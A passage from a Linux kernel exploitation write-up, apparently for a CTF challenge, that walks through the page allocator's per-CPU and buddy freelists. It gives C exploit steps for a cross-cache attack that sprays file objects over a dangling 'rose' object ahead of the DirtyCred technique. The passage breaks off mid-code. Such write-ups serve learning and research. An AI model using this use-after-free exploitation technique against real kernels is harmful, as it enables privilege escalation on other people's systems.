</span></span><span class="line"><span class="cl">				   <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">int</span> <span class="n">migratetype</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">high</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pindex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">free_high</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">__count_vm_events</span><span class="p">(</span><span class="n">PGFREE</span><span class="p">,</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">pindex</span> <span class="o">=</span> <span class="nf">order_to_pindex</span><span class="p">(</span><span class="n">migratetype</span><span class="p">,</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">page</span><span class="o">-&gt;</span><span class="n">pcp_list</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcp</span><span class="o">-&gt;</span><span class="n">lists</span><span class="p">[</span><span class="n">pindex</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="n">pcp</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * As high-order pages other than THP&#39;s stored on PCP can contribute
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * to fragmentation, limit the number stored when PCP is heavily
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * freeing without allocation. The remainder after bulk freeing
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * stops will be drained from vmstat refresh context.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">free_high</span> <span class="o">=</span> <span class="p">(</span><span class="n">pcp</span><span class="o">-&gt;</span><span class="n">free_factor</span> <span class="o">&amp;&amp;</span> <span class="n">order</span> <span class="o">&amp;&amp;</span> <span class="n">order</span> <span class="o">&lt;=</span> <span class="n">PAGE_ALLOC_COSTLY_ORDER</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">high</span> <span class="o">=</span> <span class="nf">nr_pcp_high</span><span class="p">(</span><span class="n">pcp</span><span class="p">,</span> <span class="n">zone</span><span class="p">,</span> <span class="n">free_high</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">pcp</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">high</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">batch</span> <span class="o">=</span> <span class="nf">READ_ONCE</span><span class="p">(</span><span class="n">pcp</span><span class="o">-&gt;</span><span class="n">batch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">free_pcppages_bulk</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="nf">nr_pcp_free</span><span class="p">(</span><span class="n">pcp</span><span class="p">,</span> <span class="n">high</span><span class="p">,</span> <span class="n">batch</span><span class="p">,</span> <span class="n">free_high</span><span class="p">),</span> <span class="n">pcp</span><span class="p">,</span> <span class="n">pindex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">free_pcppages_bulk</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">					<span class="k">struct</span> <span class="n">per_cpu_pages</span> <span class="o">*</span><span class="n">pcp</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">					<span class="kt">int</span> <span class="n">pindex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">			<span class="nf">__free_one_page</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="nf">page_to_pfn</span><span class="p">(</span><span class="n">page</span><span class="p">),</span> <span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">mt</span><span class="p">,</span> <span class="n">FPI_NONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Freeing function for a buddy system allocator.
</span></span></span><span class="line"><span class="cl"><span class="cm"> *
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__free_one_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pfn</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">migratetype</span><span class="p">,</span> <span class="kt">fpi_t</span> <span class="n">fpi_flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>When you get rid of a slab, it activates the <code>discard_slab</code> function, which then triggers the <code>free_unref_page_commit</code> function. This function then adds the freed page to a list called <code>pcp_list</code>. It&rsquo;s important to note that if the count of pages in this list goes beyond a certain number, these pages are moved back to the buddy system&rsquo;s free area.</p>
<p>Additionally, I&rsquo;d like to highlight the importance of returning the freed page back to the buddy system&rsquo;s free area. This is necessary because, at some stage during the slab allocation process, the <code>get_page_from_freelist</code> function will be invoked.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">get_page_from_freelist</span><span class="p">(</span><span class="kt">gfp_t</span> <span class="n">gfp_mask</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span> <span class="kt">int</span> <span class="n">alloc_flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="k">const</span> <span class="k">struct</span> <span class="n">alloc_context</span> <span class="o">*</span><span class="n">ac</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="nl">try_this_zone</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">page</span> <span class="o">=</span> <span class="nf">rmqueue</span><span class="p">(</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">preferred_zoneref</span><span class="o">-&gt;</span><span class="n">zone</span><span class="p">,</span> <span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				<span class="n">gfp_mask</span><span class="p">,</span> <span class="n">alloc_flags</span><span class="p">,</span> <span class="n">ac</span><span class="o">-&gt;</span><span class="n">migratetype</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">prep_new_page</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">gfp_mask</span><span class="p">,</span> <span class="n">alloc_flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Allocate a page from the given zone.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Use pcplists for THP or &#34;cheap&#34; high-order allocations.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Do not instrument rmqueue() with KMSAN. This function may call
</span></span></span><span class="line"><span class="cl"><span class="cm"> * __msan_poison_alloca() through a call to set_pfnblock_flags_mask().
</span></span></span><span class="line"><span class="cl"><span class="cm"> * If __msan_poison_alloca() attempts to allocate pages for the stack depot, it
</span></span></span><span class="line"><span class="cl"><span class="cm"> * may call rmqueue() again, which will result in a deadlock.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="n">__no_sanitize_memory</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">rmqueue</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">preferred_zone</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">gfp_t</span> <span class="n">gfp_flags</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">alloc_flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">int</span> <span class="n">migratetype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">likely</span><span class="p">(</span><span class="nf">pcp_allowed_order</span><span class="p">(</span><span class="n">order</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * MIGRATE_MOVABLE pcplist could have the pages on CMA area and
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * we need to skip it when CMA area isn&#39;t allowed.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">IS_ENABLED</span><span class="p">(</span><span class="n">CONFIG_CMA</span><span class="p">)</span> <span class="o">||</span> <span class="n">alloc_flags</span> <span class="o">&amp;</span> <span class="n">ALLOC_CMA</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">				<span class="n">migratetype</span> <span class="o">!=</span> <span class="n">MIGRATE_MOVABLE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">page</span> <span class="o">=</span> <span class="nf">rmqueue_pcplist</span><span class="p">(</span><span class="n">preferred_zone</span><span class="p">,</span> <span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">					<span class="n">migratetype</span><span class="p">,</span> <span class="n">alloc_flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nf">likely</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">page</span> <span class="o">=</span> <span class="nf">rmqueue_buddy</span><span class="p">(</span><span class="n">preferred_zone</span><span class="p">,</span> <span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">alloc_flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">							<span class="n">migratetype</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Lock and remove page from the per-cpu list */</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">rmqueue_pcplist</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">preferred_zone</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">int</span> <span class="n">migratetype</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">alloc_flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="n">list</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pcp</span><span class="o">-&gt;</span><span class="n">lists</span><span class="p">[</span><span class="nf">order_to_pindex</span><span class="p">(</span><span class="n">migratetype</span><span class="p">,</span> <span class="n">order</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">	<span class="n">page</span> <span class="o">=</span> <span class="nf">__rmqueue_pcplist</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">migratetype</span><span class="p">,</span> <span class="n">alloc_flags</span><span class="p">,</span> <span class="n">pcp</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__always_inline</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">rmqueue_buddy</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">preferred_zone</span><span class="p">,</span> <span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">alloc_flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			   <span class="kt">int</span> <span class="n">migratetype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">order</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">alloc_flags</span> <span class="o">&amp;</span> <span class="n">ALLOC_HARDER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">page</span> <span class="o">=</span> <span class="nf">__rmqueue_smallest</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">MIGRATE_HIGHATOMIC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__always_inline</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">__rmqueue_smallest</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="kt">int</span> <span class="n">migratetype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* Find a page of the appropriate size in the preferred list */</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">current_order</span> <span class="o">=</span> <span class="n">order</span><span class="p">;</span> <span class="n">current_order</span> <span class="o">&lt;</span> <span class="n">MAX_ORDER</span><span class="p">;</span> <span class="o">++</span><span class="n">current_order</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">area</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">zone</span><span class="o">-&gt;</span><span class="n">free_area</span><span class="p">[</span><span class="n">current_order</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="n">page</span> <span class="o">=</span> <span class="nf">get_page_from_free_area</span><span class="p">(</span><span class="n">area</span><span class="p">,</span> <span class="n">migratetype</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observed that the system first attempts to retrieve a page from the <code>pcp</code> freelist, before moving on to fetch a page from the buddy system&rsquo;s free area. Inside <code>rmqueue_pcplist</code>, the list is accessed based on its order, while <code>rmqueue_buddy</code> (which eventually calls <code>__rmqueue_smallest</code>) iterates through each freelist from the requested order up to <code>MAX_ORDER</code>. Hence, from what I understand, when we are trying to allocate a new page with order 0 utilizing the <code>pcp_list</code>, it doesn&rsquo;t check the freelist of higher orders. This is why we need to make sure that the previously discarded slab is moved back to the buddy system first.</p>
<p>How do we achieve this? As mentioned earlier, we can fill up the <code>pcp_list</code> which would prompt the <code>free_unref_page_commit</code> function to release the pages back into the buddy system.</p>
<p>To initiate this, we can add an extra step where we simply release all the objects we previously sprayed, with the expectation that this will fill up the <code>pcp_list</code> and allow our page to be released back into the buddy system.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">// Step 7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 7: Make PCP freelist full, so that page goes to free area in buddy&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_deinit</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We try to make the page stored in pcp goes to free area by making
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// the pcp freelist full. 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Free all allocation that we&#39;ve made before to trigger it, and after that
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// We can start our cross-cach exploitation.
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we&rsquo;ve managed to return the page to the buddy system, it&rsquo;s time to trigger the <code>DirtyCred</code> technique. We plan to use a strategy we learned from <a href="https://twitter.com/n0psledbyte" target="_blank" rel="noopener noreffer ">n0psledbyte</a> during the zer0pts CTF. He demonstrated an easier <a href="https://gist.github.com/d4em0n/470bd48ab6c084be0239f29759cd8747" target="_blank" rel="noopener noreffer ">method</a> using <code>mmap</code> instead of a race condition in the <code>write</code> syscall to achieve this.</p>
<p>To revisit our current situation, we have one <code>rose</code> file descriptor (FD) that is linked to a chunk located in the free page. Next, we intend to create numerous <code>file</code> objects, with hope that a new slab will be assigned using the free page, so that one of the newly generated <code>file</code> objects will overlap with the chunk addressed by our remaining <code>rose</code> FD. Let&rsquo;s proceed to execute this spray strategy.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Start the main exploit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger cross-cache, file will use the freed page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Spray FDs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">spray_fds</span><span class="p">[</span><span class="n">NUM_SPRAY_FDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">NUM_SPRAY_FDS</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/a&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span> <span class="c1">// /tmp/a is a writable file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;Failed to open FDs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Note that the size of a <code>file</code> object is <code>256</code> bytes, which can be evenly divided by the size of the <code>rose</code> object, which is <code>1024</code> bytes. This ensures that if a new slab for the <code>file</code> objects is created using our freed page, at least one <code>file</code> object will perfectly overlap with our dangling <code>rose</code> object, starting from the same address.</p>
<p>After the spraying process, we can attempt to close the existing <code>rose</code> FD, so that it will release one of the files we just sprayed. Next, to determine which index of <code>spray_fds</code> corresponds to the same chunk as the <code>rose</code> FD, we can spray additional file descriptors. We hope that one of the newly sprayed files will reuse the chunk we just released through <code>rose</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">// Spray to replace the previously freed chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Set the lseek to 0x8, so that we can find easily the fd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Find the freed FD using lseek&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">spray_fds_2</span><span class="p">[</span><span class="n">NUM_SPRAY_FDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/a&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">lseek</span><span class="p">(</span><span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (Because new file)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Note that we use <code>lseek</code> on <code>spray_fds_2</code> by <code>0x8</code> to help us in identifying the correct index of the <code>spray_fds</code> that we just released using <code>rose</code>. Let&rsquo;s proceed to locate it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">// The freed fd will have lseek value set to 0x8. Try to find it.
